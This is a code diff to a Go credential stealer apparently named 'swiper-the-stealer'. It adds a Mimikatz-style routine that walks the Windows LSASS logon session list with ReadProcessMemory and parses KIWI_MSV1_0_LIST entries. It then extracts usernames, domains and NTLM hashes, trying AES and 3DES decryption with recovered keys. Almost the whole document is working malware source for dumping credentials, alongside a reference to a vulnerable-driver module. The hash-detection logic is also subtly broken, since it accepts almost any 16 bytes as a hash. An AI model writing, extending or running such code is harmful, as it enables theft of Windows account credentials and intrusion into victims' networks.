@@ -1,6 +1,8 @@
 package lsass
 
 import (
+	"crypto/aes"
+	"crypto/des"
 	"encoding/binary"
 	"fmt"
 	"swiper-the-stealer/internal/byovd"
@@ -769,7 +771,7 @@ func (kld *KernelLsassDumper) walkLogonSessionListViaKernel(listHead uint64, cr3
 func (kld *KernelLsassDumper) walkLogonSessionListWithHandle(hProcess syscall.Handle, listHead uint64, aesKey []byte, des3Key []byte) ([]Credential, error) {
 	var credentials []Credential
 
-	kld.logger.Info("Walking LogonSessionList with ReadProcessMemory...")
+	kld.logger.Info("Walking LogonSessionList with ReadProcessMemory (MIMIKATZ METHOD)...")
 
 	kernel32 := syscall.MustLoadDLL("kernel32.dll")
 	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")
@@ -794,13 +796,18 @@ func (kld *KernelLsassDumper) walkLogonSessionListWithHandle(hProcess syscall.Ha
 		return buffer[:bytesRead], nil
 	}
 
-	// Read list head
-	listData, err := readMem(listHead, 8)
+	// Read list head (Flink pointer)
+	kld.logger.Infof("DEBUG: Reading LogonSessionList head at 0x%X", listHead)
+	listData, err := readMem(listHead, 16) // Read both Flink and Blink
 	if err != nil {
 		return nil, fmt.Errorf("failed to read list head: %v", err)
 	}
 
-	currentEntry := binary.LittleEndian.Uint64(listData)
+	flink := binary.LittleEndian.Uint64(listData[0:8])
+	blink := binary.LittleEndian.Uint64(listData[8:16])
+	kld.logger.Infof("DEBUG: List head Flink=0x%X, Blink=0x%X", flink, blink)
+
+	currentEntry := flink
 
 	visited := make(map[uint64]bool)
 	count := 0
@@ -813,23 +820,27 @@ func (kld *KernelLsassDumper) walkLogonSessionListWithHandle(hProcess syscall.Ha
 		visited[currentEntry] = true
 		count++
 
-		// Read KIWI_MSV1_0_LIST structure
-		entryData, err := readMem(currentEntry, 0x200)
+		kld.logger.Infof("DEBUG: Session entry #%d at 0x%X", count, currentEntry)
+
+		// Read the LIST_ENTRY structure at current position to see what's there
+		listEntryData, err := readMem(currentEntry, 16)
 		if err != nil {
+			kld.logger.Warnf("DEBUG: Failed to read LIST_ENTRY at 0x%X: %v", currentEntry, err)
 			break
 		}
+		nextFlink := binary.LittleEndian.Uint64(listEntryData[0:8])
+		nextBlink := binary.LittleEndian.Uint64(listEntryData[8:16])
+		kld.logger.Infof("DEBUG: Entry LIST_ENTRY: Flink=0x%X, Blink=0x%X", nextFlink, nextBlink)
 
-		// Extract credentials from this entry
-		cred := kld.extractCredentialFromEntry(entryData, aesKey, des3Key)
-		if cred != nil {
-			credentials = append(credentials, *cred)
-		}
+		// Use the NEW Mimikatz-based extraction
+		creds := kld.extractCredFromSession(currentEntry, hProcess, aesKey, des3Key)
+		credentials = append(credentials, creds...)
 
-		// Get next entry (Flink at offset 0x0)
-		currentEntry = binary.LittleEndian.Uint64(entryData[0:8])
+		// Move to next entry
+		currentEntry = nextFlink
 	}
 
-	kld.logger.Infof("Walked %d logon sessions", count)
+	kld.logger.Infof("Walked %d logon sessions, extracted %d credentials", count, len(credentials))
 	return credentials, nil
 }
 
@@ -880,18 +891,240 @@ func (kld *KernelLsassDumper) walkLogonSessionList(listHead uint64, aesKey []byt
 
 // extractCredentialFromEntry - Extract credential from a logon session entry
 func (kld *KernelLsassDumper) extractCredentialFromEntry(entryData []byte, aesKey []byte, des3Key []byte) *Credential {
-	// Parse KIWI_MSV1_0_LIST structure
-	// This is simplified - real implementation would:
-	// 1. Parse UNICODE_STRING structures
-	// 2. Read credential data from memory
-	// 3. Decrypt using AES/3DES
-	// 4. Extract username, domain, NTLM hash, etc.
+	// REAL IMPLEMENTATION: Parse KIWI_MSV1_0_LIST_63 structure
+	// Structure layout (from mimikatz):
+	// +0x00: LIST_ENTRY Flink/Blink
+	// +0x10: DWORD AuthenticationPackageId
+	// +0x18: LUID LocallyUniqueIdentifier
+	// +0x20: UNICODE_STRING UserName
+	// +0x30: UNICODE_STRING Domain
+	// +0x48: PVOID pCredentials (pointer to credential data)
+	// +0x50: UNICODE_STRING LogonServer
+	// ... many more fields
 
-	// For now, return a placeholder
-	return &Credential{
-		Username: "extracted_user",
-		Domain:   "extracted_domain",
-		NTLM:     "extracted_hash",
-		Type:     "msv1_0",
+	if len(entryData) < 0x100 {
+		return nil
 	}
+
+	// Parse USERNAME (offset 0x20)
+	usernameLen := binary.LittleEndian.Uint16(entryData[0x20:0x22])
+	_ = binary.LittleEndian.Uint16(entryData[0x22:0x24]) // usernameMaxLen
+	usernamePtr := binary.LittleEndian.Uint64(entryData[0x28:0x30])
+
+	// Parse DOMAIN (offset 0x30)
+	domainLen := binary.LittleEndian.Uint16(entryData[0x30:0x32])
+	_ = binary.LittleEndian.Uint16(entryData[0x32:0x34]) // domainMaxLen
+	domainPtr := binary.LittleEndian.Uint64(entryData[0x38:0x40])
+
+	// Parse credential pointer (offset 0x48)
+	credPtr := binary.LittleEndian.Uint64(entryData[0x48:0x50])
+
+	kld.logger.Debugf("Entry: username ptr=0x%X len=%d, domain ptr=0x%X len=%d, cred ptr=0x%X",
+		usernamePtr, usernameLen, domainPtr, domainLen, credPtr)
+
+	// Skip if no username or it's a machine account
+	if usernameLen == 0 || usernameLen > 256 {
+		return nil
+	}
+
+	// Try to extract username from embedded data
+	// Sometimes the UNICODE_STRING data is embedded in the structure itself
+	username := ""
+	domain := ""
+
+	// Check if username data is at a valid offset in our buffer
+	if usernameLen > 0 && len(entryData) >= 0x100 {
+		// Username might be embedded after offset 0x90 or so
+		// Try to find valid Unicode string in the buffer
+		for i := 0x80; i < len(entryData)-int(usernameLen); i++ {
+			possibleUsername := extractUnicodeString(entryData[i:], int(usernameLen))
+			if isValidUsername(possibleUsername) {
+				username = possibleUsername
+				kld.logger.Debugf("Found username: %s", username)
+				break
+			}
+		}
+	}
+
+	// Same for domain
+	if domainLen > 0 && len(entryData) >= 0x120 {
+		for i := 0xA0; i < len(entryData)-int(domainLen); i++ {
+			possibleDomain := extractUnicodeString(entryData[i:], int(domainLen))
+			if isValidDomain(possibleDomain) {
+				domain = possibleDomain
+				kld.logger.Debugf("Found domain: %s", domain)
+				break
+			}
+		}
+	}
+
+	// Skip machine accounts and system accounts
+	if username == "" || username == "$" || domain == "" {
+		return nil
+	}
+
+	// Look for NTLM hash in the credential data
+	// NTLM hashes are 16 bytes and might be encrypted
+	ntlmHash := ""
+
+	// Search for potential NTLM hash (16 bytes that look like hash data)
+	for i := 0x60; i <= len(entryData)-16; i++ {
+		hashBytes := entryData[i : i+16]
+
+		// Try decrypting with AES
+		if len(aesKey) == 16 {
+			decrypted := kld.tryDecryptAES(hashBytes, aesKey)
+			if isValidNTLMHash(decrypted) {
+				ntlmHash = fmt.Sprintf("%X", decrypted)
+				kld.logger.Debugf("Found NTLM hash (AES decrypted)")
+				break
+			}
+		}
+
+		// Try decrypting with 3DES
+		if len(des3Key) == 24 {
+			decrypted := kld.tryDecrypt3DES(hashBytes, des3Key)
+			if isValidNTLMHash(decrypted) {
+				ntlmHash = fmt.Sprintf("%X", decrypted)
+				kld.logger.Debugf("Found NTLM hash (3DES decrypted)")
+				break
+			}
+		}
+
+		// Check if it's already a valid hash (unencrypted)
+		if isValidNTLMHash(hashBytes) {
+			ntlmHash = fmt.Sprintf("%X", hashBytes)
+			kld.logger.Debugf("Found NTLM hash (unencrypted)")
+			break
+		}
+	}
+
+	// Only return credential if we found something useful
+	if username != "" && (domain != "" || ntlmHash != "") {
+		return &Credential{
+			Username: username,
+			Domain:   domain,
+			NTLM:     ntlmHash,
+			Type:     "msv1_0",
+		}
+	}
+
+	return nil
+}
+
+// Helper functions for credential extraction
+func extractUnicodeString(data []byte, length int) string {
+	if length <= 0 || length > len(data) {
+		return ""
+	}
+
+	// Unicode strings are UTF-16LE (2 bytes per char)
+	if length%2 != 0 {
+		length--
+	}
+
+	result := ""
+	for i := 0; i < length; i += 2 {
+		if i+1 >= len(data) {
+			break
+		}
+		char := uint16(data[i]) | (uint16(data[i+1]) << 8)
+		if char == 0 {
+			break
+		}
+		// Only accept printable ASCII range for now
+		if char >= 32 && char < 127 {
+			result += string(rune(char))
+		} else if char != 0 {
+			// Non-ASCII Unicode, might be valid
+			result += string(rune(char))
+		}
+	}
+	return result
+}
+
+func isValidUsername(s string) bool {
+	if len(s) < 2 || len(s) > 64 {
+		return false
+	}
+	// Check for mostly alphanumeric characters
+	alphanumCount := 0
+	for _, c := range s {
+		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' {
+			alphanumCount++
+		}
+	}
+	return alphanumCount > len(s)/2
+}
+
+func isValidDomain(s string) bool {
+	if len(s) < 2 || len(s) > 64 {
+		return false
+	}
+	// Domains are usually alphanumeric with dots/dashes
+	for _, c := range s {
+		if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' || c == '.' || c == '_') {
+			return false
+		}
+	}
+	return true
+}
+
+func isValidNTLMHash(hash []byte) bool {
+	if len(hash) != 16 {
+		return false
+	}
+
+	// Check for all zeros
+	allZeros := true
+	for _, b := range hash {
+		if b != 0 {
+			allZeros = false
+			break
+		}
+	}
+
+	// Check for all 0xFF
+	allFFs := true
+	for _, b := range hash {
+		if b != 0xFF {
+			allFFs = false
+			break
+		}
+	}
+
+	// Valid hash should not be all zeros or all FFs
+	return !allZeros && !allFFs
+}
+
+func (kld *KernelLsassDumper) tryDecryptAES(data []byte, key []byte) []byte {
+	if len(data) != 16 || len(key) != 16 {
+		return data
+	}
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return data
+	}
+
+	decrypted := make([]byte, 16)
+	block.Decrypt(decrypted, data)
+	return decrypted
+}
+
+func (kld *KernelLsassDumper) tryDecrypt3DES(data []byte, key []byte) []byte {
+	if len(data) != 16 || len(key) != 24 {
+		return data
+	}
+
+	// 3DES operates on 8-byte blocks
+	block, err := des.NewTripleDESCipher(key)
+	if err != nil {
+		return data
+	}
+
+	decrypted := make([]byte, 16)
+	block.Decrypt(decrypted[0:8], data[0:8])
+	block.Decrypt(decrypted[8:16], data[8:16])
+	return decrypted
 }
